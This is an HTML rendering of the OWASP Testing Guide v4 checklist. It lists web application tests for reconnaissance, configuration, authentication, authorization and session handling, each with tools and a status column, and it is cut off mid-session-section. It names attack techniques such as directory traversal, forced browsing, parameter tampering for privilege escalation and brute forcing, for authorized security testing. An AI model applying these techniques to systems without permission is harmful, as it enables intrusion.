## lsjfl




<hr>
	<p><center>
		<h1>Overview</h1>
		<A HREF="#table0">Testing Checklist</A><br>
		<A HREF="#table1">Summary Findings</A><br>
		<A HREF="#table2">Risk Assessment Calculator</A><br>
		<A HREF="#table3">References</A><br>
		
	</center></p>
<hr>
<A NAME="table0"><h1>Sheet 1: <em>Testing Checklist</em></h1></A>
<table cellspacing="0" border="0">
	<colgroup width="154"></colgroup>
	<colgroup width="380"></colgroup>
	<colgroup width="398"></colgroup>
	<colgroup width="190"></colgroup>
	<colgroup width="80"></colgroup>
	<colgroup width="65"></colgroup>
	<tr>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" colspan=2 height="24" align="left" valign=middle><b><font size=4>OWASP: Testing Guide v4 Checklist</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td colspan=2 height="17" align="left" valign=middle><i><br></i></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><i><br></i></td>
		<td align="left" valign=middle><i><br></i></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Information Gathering</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INFO-001</td>
		<td align="left" valign=middle>Conduct Search Engine Discovery and Reconnaissance for Information Leakage</td>
		<td align="left" valign=bottom><i><font color="#808080">Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Google Hacking, Sitedigger, Shodan, FOCA, Punkspider</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-INFO-002</td>
		<td align="left" valign=middle>Fingerprint Web Server</td>
		<td align="left" valign=bottom><i><font color="#808080">Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using<br>&quot;HTTP header field ordering&quot; and &quot;Malformed requests test&quot;.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Httprint, Httprecon, Desenmascarame</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-INFO-003</td>
		<td align="left" valign=middle>Review Webserver Metafiles for Information Leakage</td>
		<td align="left" valign=bottom><i><font color="#808080">Analyze robots.txt and identify &lt;META&gt; Tags from website.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, curl, wget</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="56" align="left" valign=middle>OTG-INFO-004</td>
		<td align="left" valign=middle>Enumerate Applications on Webserver</td>
		<td align="left" valign=bottom><i><font color="#808080">Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INFO-005</td>
		<td align="left" valign=middle>Review Webpage Comments and Metadata for Information Leakage</td>
		<td align="left" valign=bottom><i><font color="#808080">Find sensitive information from webpage comments and Metadata on source code.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, curl, wget</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-INFO-006</td>
		<td align="left" valign=middle>Identify application entry points</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify from hidden fields, parameters, methods HTTP header analysis</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp proxy, ZAP, Tamper data</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=middle>OTG-INFO-007</td>
		<td align="left" valign=middle>Map execution paths through application</td>
		<td align="left" valign=middle><i><font color="#808080">Map the target application and understand the principal workflows.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INFO-008</td>
		<td align="left" valign=middle>Fingerprint Web Application Framework</td>
		<td align="left" valign=bottom><i><font color="#808080">Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Whatweb, BlindElephant, Wappalyzer</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INFO-009</td>
		<td align="left" valign=middle>Fingerprint Web Application</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify the web application and version to determine known vulnerabilities and the appropriate exploits.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Whatweb, BlindElephant, Wappalyzer, CMSmap</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-INFO-010</td>
		<td align="left" valign=middle>Map Application Architecture</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, curl, wget</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="56" align="left" valign=middle bgcolor="#8EB4E3"><b>Configuration and Deploy Management Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-CONFIG-001</td>
		<td align="left" valign=middle>Test Network/Infrastructure Configuration</td>
		<td align="left" valign=bottom><i><font color="#808080">Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Nessus</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CONFIG-002</td>
		<td align="left" valign=middle>Test Application Platform Configuration</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, Nikto</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-CONFIG-003</td>
		<td align="left" valign=middle>Test File Extensions Handling for Sensitive Information</td>
		<td align="left" valign=bottom><i><font color="#808080">Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, Nikto</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CONFIG-004</td>
		<td align="left" valign=middle>Backup and Unreferenced Files for Sensitive Information</td>
		<td align="left" valign=bottom><i><font color="#808080">Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Nessus, Nikto, Wikto</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-CONFIG-005</td>
		<td align="left" valign=middle>Enumerate Infrastructure and Application Admin Interfaces</td>
		<td align="left" valign=bottom><i><font color="#808080">Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CONFIG-006</td>
		<td align="left" valign=middle>Test HTTP Methods</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">netcat, curl</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CONFIG-007</td>
		<td align="left" valign=middle>Test HTTP Strict Transport Security</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify HSTS header on Web server through HTTP response header. <br>curl -s -D- https://domain.com/ | grep Strict</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, curl</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CONFIG-008</td>
		<td align="left" valign=middle>Test RIA cross domain policy</td>
		<td align="left" valign=bottom><i><font color="#808080">Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Nikto</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle bgcolor="#8EB4E3"><b>Identity Management Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-IDENT-001</td>
		<td align="left" valign=middle>Test Role Definitions</td>
		<td align="left" valign=bottom><i><font color="#808080">Validate the system roles defined within the application by creating permission matrix.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="32" align="left" valign=middle>OTG-IDENT-002</td>
		<td align="left" valign=middle>Test User Registration Process</td>
		<td align="left" valign=bottom><i><font color="#808080">Verify that the identity requirements for user registration are aligned<br>with business and security requirements:</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="32" align="left" valign=middle>OTG-IDENT-003</td>
		<td align="left" valign=middle>Test Account Provisioning Process</td>
		<td align="left" valign=bottom><i><font color="#808080">Determine which roles are able to provision users and what sort of<br>accounts they can provision.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-IDENT-004</td>
		<td align="left" valign=middle>Testing for Account Enumeration and Guessable User Account</td>
		<td align="left" valign=bottom><i><font color="#808080">Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-IDENT-005</td>
		<td align="left" valign=middle>Testing for Weak or unenforced username policy</td>
		<td align="left" valign=bottom><i><font color="#808080">User account names are often highly structured (e.g. Joe Bloggs<br>account name is jbloggs and Fred Nurks account name is fnurks)<br>and valid account names can easily be guessed.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-IDENT-006</td>
		<td align="left" valign=middle>Test Permissions of Guest/Training Accounts</td>
		<td align="left" valign=bottom><i><font color="#808080">Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorisation process required for access.Evaluate consistency between access policy and guest/training account access permissions.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-IDENT-007</td>
		<td align="left" valign=middle>Test Account Suspension/Resumption Process</td>
		<td align="left" valign=bottom><i><font color="#808080">Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Authentication Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHN-001</td>
		<td align="left" valign=middle>Testing for Credentials Transported over an Encrypted Channel</td>
		<td align="left" valign=bottom><i><font color="#808080">Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHN-002</td>
		<td align="left" valign=middle>Testing for default credentials</td>
		<td align="left" valign=bottom><i><font color="#808080">Testing for default credentials of common applications, Testing for default password of new accounts.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Hydra</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-AUTHN-003</td>
		<td align="left" valign=middle>Testing for Weak lock out mechanism</td>
		<td align="left" valign=bottom><i><font color="#808080">Evaluate the account lockout mechanism’s ability to mitigate<br>brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="34" align="left" valign=middle>OTG-AUTHN-004</td>
		<td align="left" valign=middle>Testing for bypassing authentication schema</td>
		<td align="left" valign=bottom><i><font color="#808080">Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-AUTHN-005</td>
		<td align="left" valign=middle>Test remember password functionality</td>
		<td align="left" valign=bottom><i><font color="#808080">Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-AUTHN-006</td>
		<td align="left" valign=middle>Testing for Browser cache weakness</td>
		<td align="left" valign=bottom><i><font color="#808080">Check browser history issue by clicking &quot;Back&quot; button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Firefox add-on CacheViewer2</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="66" align="left" valign=middle>OTG-AUTHN-007</td>
		<td align="left" valign=middle>Testing for Weak password policy</td>
		<td align="left" valign=bottom><i><font color="#808080">Determine the resistance of the application against brute force<br>password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of<br>passwords.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Hydra</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-AUTHN-008</td>
		<td align="left" valign=middle>Testing for Weak security question/answer</td>
		<td align="left" valign=bottom><i><font color="#808080">Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-AUTHN-009</td>
		<td align="left" valign=middle>Testing for weak password change or reset functionalities</td>
		<td align="left" valign=bottom><i><font color="#808080">Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser, Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHN-010</td>
		<td align="left" valign=middle>Testing for Weaker authentication in alternative channel</td>
		<td align="left" valign=bottom><i><font color="#808080">Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Browser</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Authorization Testing </b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHZ-001</td>
		<td align="left" valign=middle>Testing Directory traversal/file include</td>
		<td align="left" valign=bottom><i><font color="#808080">dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Wfuzz</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHZ-002</td>
		<td align="left" valign=middle>Testing for bypassing authorization schema</td>
		<td align="left" valign=bottom><i><font color="#808080">Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy (Autorize), ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-AUTHZ-003</td>
		<td align="left" valign=middle>Testing for Privilege Escalation</td>
		<td align="left" valign=bottom><i><font color="#808080">Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy (Autorize), ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-AUTHZ-004</td>
		<td align="left" valign=middle>Testing for Insecure Direct Object References</td>
		<td align="left" valign=bottom><i><font color="#808080">Force changing parameter value (?invoice=123 -&gt; ?invoice=456)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy (Autorize), ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle bgcolor="#8EB4E3"><b>Session Management Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-SESS-001</td>
		<td align="left" valign=middle>Testing for Bypassing Session Management Schema</td>
		<td align="left" valign=bottom><i><font color="#808080">SessionID analysis prediction, unencrypted cookie transport, brute-force.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ForceSSL, ZAP, CookieDigger</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-SESS-002</td>
		<td align="left" valign=middle>Testing for Cookies attributes</td>
		<td align="left" valign=bottom><i><font color="#808080">Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-SESS-003</td>
		<td align="left" valign=middle>Testing for Session Fixation</td>
		<td align="left" valign=bottom><i><font color="#808080">The application doesn't renew the cookie after a successfully user authentication.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-SESS-004</td>
		<td align="left" valign=middle>Testing for Exposed Session Variables</td>
		<td align="left" valign=bottom><i><font color="#808080">Encryption &amp; Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="56" align="left" valign=middle>OTG-SESS-005</td>
		<td align="left" valign=middle>Testing for Cross Site Request Forgery</td>
		<td align="left" valign=bottom><i><font color="#808080">URL analysis, Direct access to functions without any token.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy (csrf_token_detect), burpy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-SESS-006</td>
		<td align="left" valign=middle>Testing for logout functionality</td>
		<td align="left" valign=bottom><i><font color="#808080">Check reuse session after logout both server-side and SSO.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-SESS-007</td>
		<td align="left" valign=middle>Test Session Timeout</td>
		<td align="left" valign=bottom><i><font color="#808080">Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-SESS-008</td>
		<td align="left" valign=middle>Testing for Session puzzling</td>
